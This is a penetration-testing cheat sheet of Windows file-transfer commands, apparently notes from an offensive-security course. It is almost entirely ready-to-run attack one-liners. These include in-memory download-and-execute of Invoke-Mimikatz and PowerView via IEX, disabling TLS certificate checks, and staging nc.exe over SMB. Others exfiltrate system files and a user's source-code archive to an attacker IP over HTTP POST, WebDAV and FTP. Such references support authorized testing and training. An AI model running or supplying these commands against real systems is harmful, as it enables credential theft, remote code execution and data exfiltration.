# Windows File Transfers

***

```bash
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

## PowerShell Web Downloads

| Method              | Description                                                                                   |
| ------------------- | --------------------------------------------------------------------------------------------- |
| OpenRead            | Returns the data from a resource as a Stream.                                                 |
| OpenReadAsync       | Returns the data from a resource, without blocking the calling thread.                        |
| DownloadData        | Downloads data from a resource and returns a Byte array.                                      |
| DownloadDataAsync   | Downloads data from a resource and returns a Byte array, without blocking the calling thread. |
| DownloadFile        | Downloads data from a resource to a local file.                                               |
| DownloadFileAsync   | Downloads data from a resource to a local file, without blocking the calling thread.          |
| DownloadString      | Downloads a String from a resource and returns a String.                                      |
| DownloadStringAsync | Downloads a String from a resource, without blocking the calling thread.                      |

```bash
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
```

```bash
(New-Object
Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
```

### Fileless Method

Fileless attacks work by using some operating system functions to download the payload and execute it directly.

```bash
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

```bash
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### Common Errors bypass

```bash
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

```bash
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads

We can use SMB to download files from our Pwnbox easily. We need to create an SMB server in our Pwnbox with _smbserver.py_ from Impacket and then use copy, move, PowerShell Copy-Item, or any other tool that allows connection to SMB.

### Create smb server

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare

sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### Copy files from server

```bash
copy \\192.168.220.133\share\nc.exe
```

New versions of Windows block unauthenticated guest access

```bash
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

Note: You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

## FTP Downloads

```bash
sudo python3 -m pyftpdlib --port 21
```

```bash
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

## Upload Operations

### Encode

```bash
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
```

### Upload server

```bash
python3 -m uploadserver
```

```bash
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### Nc

```bash
nc -lvnp 8000
```

```bash
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

### WebDav

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```bash
dir \\192.168.49.128\DavWWWRoot

copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

Note: If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

### FTP Uploads

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

```bash
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
